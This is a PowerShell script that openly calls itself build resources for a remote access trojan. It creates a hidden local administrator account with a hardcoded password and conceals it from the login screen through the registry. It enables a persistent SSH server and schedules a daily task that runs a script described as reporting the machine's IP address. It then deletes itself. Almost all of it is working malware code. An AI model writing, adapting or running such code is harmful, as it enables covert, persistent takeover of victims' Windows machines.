# Build resources for RAT
# Created by: Sulaxshayan

function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

# Creates the local admin for RAT 
function create_account {
    [CmdletBinding()]
    param (
        [string] $uname,
        [securestring] $pword
    )
    
    begin {
        Write-Verbose "Starting the process to create a new local admin..."
    }
    
    process {
        try {
            New-LocalUser "$uname" -Password $pword -FullName "uname" -Description "Temporary local admin"
            Write-Verbose "New local user '$uname' created successfully."
            Add-LocalGroupMember -Group "Administrators" -Member "$uname"
            Write-Verbose "'$uname' added to the local administrators group."
        } catch {
            Write-Error "Failed to create local user or add to administrators group: $_"
        }
    }
    
    end {
        Write-Verbose "Process completed."
    }
}

# Make admin
$uname = "WindowsGuest"
$pword = ConvertTo-SecureString "OnlyRat123" -AsPlainText -Force
create_account -uname $uname -pword $pword -Verbose

# Hide the local admin account from the login screen
try {
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $regName = "SpecialAccounts\UserList"
    $fullRegPath = "$regPath\$regName"

    if (-not (Test-Path $fullRegPath)) {
        New-Item -Path $regPath -Name $regName -Force
    }

    Set-ItemProperty -Path $fullRegPath -Name $uname -Value 0
    Write-Verbose "Local admin account '$uname' hidden from login screen."
} catch {
    Write-Error "Failed to hide local admin account: $_"
}

# Variables
$wd = random_text
$path = "$env:temp\$wd"
$initial_dir = Get-Location

# Ensure persistent SSH connection
try {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
    Start-Service sshd
    Set-Service -Name sshd -StartupType 'Automatic'
    Get-NetFirewallRule -Name *ssh* | Format-Table
    Write-Verbose "OpenSSH Server installed and started successfully."
} catch {
    Write-Error "Failed to install or start OpenSSH Server: $_"
}

# Create working directory in temp
try {
    mkdir $path
    cd $path
    Write-Verbose "Working directory created at $path."
} catch {
    Write-Error "Failed to create working directory: $_"
}

# Schedule the IP change notification script
try {
    $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-File `"$env:temp\SendIPChangeNotification.ps1`""
    $trigger = New-ScheduledTaskTrigger -Daily -At 12:00PM
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    $taskName = "IPChangeNotification"
    $taskDescription = "Sends an email when the IP address changes"
    
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $taskDescription -Settings $settings
    Write-Verbose "Scheduled task for IP change notification created successfully."
} catch {
    Write-Error "Failed to create scheduled task for IP change notification: $_"
}

# Self-delete (optional, uncomment if needed)
try {
    cd $initial_dir
    Remove-Item -Path $MyInvocation.MyCommand.Path -Force
    Write-Verbose "Script deleted itself successfully."
} catch {
    Write-Error "Failed to delete script: $_"
}
